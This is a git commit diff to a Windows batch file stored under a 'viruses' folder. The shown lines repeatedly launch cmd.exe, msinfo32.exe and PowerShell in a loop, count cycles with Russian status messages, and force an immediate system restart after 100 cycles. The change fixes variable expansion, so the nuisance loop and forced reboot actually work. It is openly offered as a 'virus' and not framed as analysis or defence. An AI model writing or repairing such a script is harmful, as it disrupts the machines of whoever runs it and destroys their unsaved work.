a8bcdce8cac7ca1b4c550cbc4fdf0d86cda8e16c
osager-net <RuslanGamidov2015@yandex.ru>
2026-05-04 00:40:35 +0400

    Update virus—content.bat

--- viruses/virus—content.bat
+++ viruses/virus—content.bat
@@ -12,8 +12,8 @@ start cmd.exe
 start msinfo32.exe
 start powershell.exe
 set /a "cycles+=1"
-echo Цикл пройден. Пройдено %cycles% циклов
-if %cycles% == 100 (
+echo Цикл пройден. Пройдено !cycles! циклов
+if !cycles! == 100 (
     echo Выключение...
     shutdown /r /t 0
 )
